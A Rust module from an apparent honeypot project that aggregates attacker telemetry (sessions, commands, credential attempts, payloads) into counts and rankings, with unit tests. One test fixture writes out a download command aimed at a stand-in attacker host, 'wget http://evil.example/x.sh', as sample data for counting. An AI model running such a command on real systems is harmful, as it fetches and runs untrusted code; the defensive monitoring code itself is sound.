//! In-memory aggregation of the honeypot's `attacks.json` telemetry stream.
//!
//! `Store` is fed one [`TelemetryEvent`] at a time by the tailer in `main.rs`
//! and keeps running counters plus a capped ring buffer of recent raw events
//! for the live feed. Nothing here touches disk — it only ever sees events
//! the tailer has already parsed.

use aegis_common::TelemetryEvent;
use chrono::{DateTime, Utc};
use serde::Serialize;
use std::collections::{BTreeMap, HashMap, HashSet, VecDeque};
use std::net::IpAddr;

/// How many of the most recent events are kept verbatim for the live feed.
const RECENT_CAP: usize = 500;
/// How many hours of activity history are retained internally (the API only
/// ever exposes the most recent 24 of these).
const HOURLY_WINDOW_HOURS: i64 = 48;
/// Size of each "top N" ranking (top usernames, passwords, commands).
const TOP_N: usize = 10;

#[derive(Default)]
pub struct Store {
    total_sessions: u64,
    total_commands: u64,
    total_credentials: u64,
    total_payloads: u64,
    unique_ips: HashSet<IpAddr>,
    ip_counts: HashMap<IpAddr, u64>,
    username_counts: HashMap<String, u64>,
    password_counts: HashMap<String, u64>,
    command_counts: HashMap<String, u64>,
    hourly_activity: BTreeMap<i64, u64>,
    recent: VecDeque<TelemetryEvent>,
}

impl Store {
    /// Fold one telemetry event into the running aggregates and push it onto
    /// the recent-events ring buffer.
    pub fn ingest(&mut self, event: TelemetryEvent) {
        self.bump_hour(event_timestamp(&event));

        let ip = event_ip(&event);
        self.unique_ips.insert(ip);
        *self.ip_counts.entry(ip).or_insert(0) += 1;

        match &event {
            TelemetryEvent::SessionStart(_) => {
                self.total_sessions += 1;
            }
            TelemetryEvent::CommandRun(e) => {
                self.total_commands += 1;
                let verb = e.command.split_whitespace().next().unwrap_or(&e.command);
                *self.command_counts.entry(verb.to_string()).or_insert(0) += 1;
            }
            TelemetryEvent::CredentialHarvest(e) => {
                self.total_credentials += 1;
                *self.username_counts.entry(e.username.clone()).or_insert(0) += 1;
                if let Some(pw) = &e.password {
                    *self.password_counts.entry(pw.clone()).or_insert(0) += 1;
                }
            }
            TelemetryEvent::PayloadCaptured(_) => {
                self.total_payloads += 1;
            }
            TelemetryEvent::SessionEnd(_)
            | TelemetryEvent::SyscallExecve(_)
            | TelemetryEvent::SyscallConnect(_)
            | TelemetryEvent::SyscallMemfdCreate(_) => {}
        }

        self.recent.push_back(event);
        while self.recent.len() > RECENT_CAP {
            self.recent.pop_front();
        }
    }

    fn bump_hour(&mut self, ts: DateTime<Utc>) {
        let hour = ts.timestamp().div_euclid(3600);
        *self.hourly_activity.entry(hour).or_insert(0) += 1;
        let cutoff = Utc::now().timestamp().div_euclid(3600) - HOURLY_WINDOW_HOURS;
        self.hourly_activity.retain(|&h, _| h >= cutoff);
    }

    pub fn summary(&self) -> Summary {
        Summary {
            total_sessions: self.total_sessions,
            total_commands: self.total_commands,
            total_credentials: self.total_credentials,
            total_payloads: self.total_payloads,
            unique_ips: self.unique_ips.len() as u64,
            top_usernames: top_n(&self.username_counts),
            top_passwords: top_n(&self.password_counts),
            top_commands: top_n(&self.command_counts),
            top_ips: top_n_ip(&self.ip_counts),
            hourly_activity: self
                .hourly_activity
                .iter()
                .rev()
                .take(24)
                .map(|(&hour, &count)| HourBucket {
                    hour: DateTime::from_timestamp(hour * 3600, 0)
                        .unwrap_or_default()
                        .to_rfc3339(),
                    count,
                })
                .collect::<Vec<_>>()
                .into_iter()
                .rev()
                .collect(),
        }
    }

    /// Most recent events, newest first, optionally filtered to one event
    /// kind (matched against [`event_kind`], case-insensitively) and/or one
    /// source IP.
    pub fn recent_events(&self, limit: usize, kind: Option<&str>, ip: Option<IpAddr>) -> Vec<&TelemetryEvent> {
        self.recent
            .iter()
            .rev()
            .filter(|e| kind.map(|k| event_kind(e).eq_ignore_ascii_case(k)).unwrap_or(true))
            .filter(|e| ip.map(|target| event_ip(e) == target).unwrap_or(true))
            .take(limit)
            .collect()
    }

    /// Every buffered event belonging to one session, oldest first — the
    /// full (recent-window-bounded) timeline for a session drill-down view.
    pub fn session_events(&self, session_id: &str) -> Vec<&TelemetryEvent> {
        self.recent
            .iter()
            .filter(|e| e.session_id().map(|id| id.0 == session_id).unwrap_or(false))
            .collect()
    }
}

fn top_n(counts: &HashMap<String, u64>) -> Vec<Ranked> {
    let mut ranked: Vec<Ranked> = counts
        .iter()
        .map(|(value, &count)| Ranked { value: value.clone(), count })
        .collect();
    ranked.sort_by(|a, b| b.count.cmp(&a.count).then_with(|| a.value.cmp(&b.value)));
    ranked.truncate(TOP_N);
    ranked
}

fn top_n_ip(counts: &HashMap<IpAddr, u64>) -> Vec<Ranked> {
    let mut ranked: Vec<Ranked> = counts
        .iter()
        .map(|(ip, &count)| Ranked { value: ip.to_string(), count })
        .collect();
    ranked.sort_by(|a, b| b.count.cmp(&a.count).then_with(|| a.value.cmp(&b.value)));
    ranked.truncate(TOP_N);
    ranked
}

fn event_timestamp(event: &TelemetryEvent) -> DateTime<Utc> {
    match event {
        TelemetryEvent::SessionStart(e) => e.timestamp,
        TelemetryEvent::SessionEnd(e) => e.timestamp,
        TelemetryEvent::CredentialHarvest(e) => e.timestamp,
        TelemetryEvent::CommandRun(e) => e.timestamp,
        TelemetryEvent::SyscallExecve(e) => e.timestamp,
        TelemetryEvent::SyscallConnect(e) => e.timestamp,
        TelemetryEvent::SyscallMemfdCreate(e) => e.timestamp,
        TelemetryEvent::PayloadCaptured(e) => e.timestamp,
    }
}

fn event_ip(event: &TelemetryEvent) -> IpAddr {
    match event {
        TelemetryEvent::SessionStart(e) => e.ip,
        TelemetryEvent::SessionEnd(e) => e.ip,
        TelemetryEvent::CredentialHarvest(e) => e.ip,
        TelemetryEvent::CommandRun(e) => e.ip,
        TelemetryEvent::SyscallExecve(e) => e.ip,
        TelemetryEvent::SyscallConnect(e) => e.ip,
        TelemetryEvent::SyscallMemfdCreate(e) => e.ip,
        TelemetryEvent::PayloadCaptured(e) => e.ip,
    }
}

/// The `event` tag as written in `attacks.json` (matches `TelemetryEvent`'s
/// `#[serde(tag = "event", ...)]` representation).
pub fn event_kind(event: &TelemetryEvent) -> &'static str {
    match event {
        TelemetryEvent::SessionStart(_) => "SESSION_START",
        TelemetryEvent::SessionEnd(_) => "SESSION_END",
        TelemetryEvent::CredentialHarvest(_) => "CREDENTIAL_HARVEST",
        TelemetryEvent::CommandRun(_) => "COMMAND_RUN",
        TelemetryEvent::SyscallExecve(_) => "SYSCALL_EXECVE",
        TelemetryEvent::SyscallConnect(_) => "SYSCALL_CONNECT",
        TelemetryEvent::SyscallMemfdCreate(_) => "SYSCALL_MEMFD_CREATE",
        TelemetryEvent::PayloadCaptured(_) => "PAYLOAD_CAPTURED",
    }
}

#[derive(Serialize)]
pub struct Ranked {
    pub value: String,
    pub count: u64,
}

#[derive(Serialize)]
pub struct HourBucket {
    pub hour: String,
    pub count: u64,
}

#[derive(Serialize)]
pub struct Summary {
    pub total_sessions: u64,
    pub total_commands: u64,
    pub total_credentials: u64,
    pub total_payloads: u64,
    pub unique_ips: u64,
    pub top_usernames: Vec<Ranked>,
    pub top_passwords: Vec<Ranked>,
    pub top_commands: Vec<Ranked>,
    pub top_ips: Vec<Ranked>,
    pub hourly_activity: Vec<HourBucket>,
}

#[cfg(test)]
mod tests {
    use super::*;
    use aegis_common::{CommandRunEvent, CredentialHarvestEvent, SessionId, AuthMethod};
    use std::net::Ipv4Addr;

    fn ip() -> IpAddr {
        IpAddr::V4(Ipv4Addr::new(203, 0, 113, 5))
    }

    #[test]
    fn aggregates_credentials_and_commands() {
        let mut store = Store::default();
        store.ingest(TelemetryEvent::CredentialHarvest(CredentialHarvestEvent {
            timestamp: Utc::now(),
            session_id: SessionId::new(),
            ip: ip(),
            username: "root".into(),
            password: Some("123456".into()),
            auth_method: AuthMethod::Password,
        }));
        store.ingest(TelemetryEvent::CommandRun(CommandRunEvent {
            timestamp: Utc::now(),
            session_id: SessionId::new(),
            ip: ip(),
            command: "wget http://evil.example/x.sh".into(),
        }));

        let summary = store.summary();
        assert_eq!(summary.total_credentials, 1);
        assert_eq!(summary.total_commands, 1);
        assert_eq!(summary.unique_ips, 1);
        assert_eq!(summary.top_usernames[0].value, "root");
        assert_eq!(summary.top_passwords[0].value, "123456");
        assert_eq!(summary.top_commands[0].value, "wget");
    }

    #[test]
    fn recent_events_filters_by_kind_and_caps_at_limit() {
        let mut store = Store::default();
        for i in 0..5 {
            store.ingest(TelemetryEvent::CommandRun(CommandRunEvent {
                timestamp: Utc::now(),
                session_id: SessionId::new(),
                ip: ip(),
                command: format!("cmd{i}"),
            }));
        }
        store.ingest(TelemetryEvent::CredentialHarvest(CredentialHarvestEvent {
            timestamp: Utc::now(),
            session_id: SessionId::new(),
            ip: ip(),
            username: "admin".into(),
            password: None,
            auth_method: AuthMethod::Password,
        }));

        let all = store.recent_events(100, None, None);
        assert_eq!(all.len(), 6);

        let cmds_only = store.recent_events(100, Some("command_run"), None);
        assert_eq!(cmds_only.len(), 5);

        let capped = store.recent_events(2, None, None);
        assert_eq!(capped.len(), 2);
        // Newest first: the credential-harvest event was ingested last.
        assert!(matches!(capped[0], TelemetryEvent::CredentialHarvest(_)));
    }

    #[test]
    fn recent_ring_buffer_is_capped() {
        let mut store = Store::default();
        for i in 0..(RECENT_CAP + 50) {
            store.ingest(TelemetryEvent::CommandRun(CommandRunEvent {
                timestamp: Utc::now(),
                session_id: SessionId::new(),
                ip: ip(),
                command: format!("cmd{i}"),
            }));
        }
        assert_eq!(store.recent_events(usize::MAX, None, None).len(), RECENT_CAP);
        assert_eq!(store.summary().total_commands, (RECENT_CAP + 50) as u64);
    }

    #[test]
    fn tracks_top_ips_and_filters_events_by_ip() {
        let mut store = Store::default();
        let other_ip = IpAddr::V4(Ipv4Addr::new(198, 51, 100, 9));

        for _ in 0..3 {
            store.ingest(TelemetryEvent::CommandRun(CommandRunEvent {
                timestamp: Utc::now(),
                session_id: SessionId::new(),
                ip: ip(),
                command: "id".into(),
            }));
        }
        store.ingest(TelemetryEvent::CommandRun(CommandRunEvent {
            timestamp: Utc::now(),
            session_id: SessionId::new(),
            ip: other_ip,
            command: "whoami".into(),
        }));

        let summary = store.summary();
        assert_eq!(summary.unique_ips, 2);
        assert_eq!(summary.top_ips[0].value, ip().to_string());
        assert_eq!(summary.top_ips[0].count, 3);

        let filtered = store.recent_events(100, None, Some(other_ip));
        assert_eq!(filtered.len(), 1);
        assert!(matches!(filtered[0], TelemetryEvent::CommandRun(e) if e.command == "whoami"));
    }

    #[test]
    fn session_events_returns_only_that_sessions_timeline_oldest_first() {
        let mut store = Store::default();
        let target = SessionId::new();

        store.ingest(TelemetryEvent::CredentialHarvest(CredentialHarvestEvent {
            timestamp: Utc::now(),
            session_id: target.clone(),
            ip: ip(),
            username: "root".into(),
            password: Some("toor".into()),
            auth_method: AuthMethod::Password,
        }));
        store.ingest(TelemetryEvent::CommandRun(CommandRunEvent {
            timestamp: Utc::now(),
            session_id: SessionId::new(),
            ip: ip(),
            command: "not this session".into(),
        }));
        store.ingest(TelemetryEvent::CommandRun(CommandRunEvent {
            timestamp: Utc::now(),
            session_id: target.clone(),
            ip: ip(),
            command: "whoami".into(),
        }));

        let timeline = store.session_events(&target.0);
        assert_eq!(timeline.len(), 2);
        assert!(matches!(timeline[0], TelemetryEvent::CredentialHarvest(_)));
        assert!(matches!(timeline[1], TelemetryEvent::CommandRun(e) if e.command == "whoami"));
    }
}
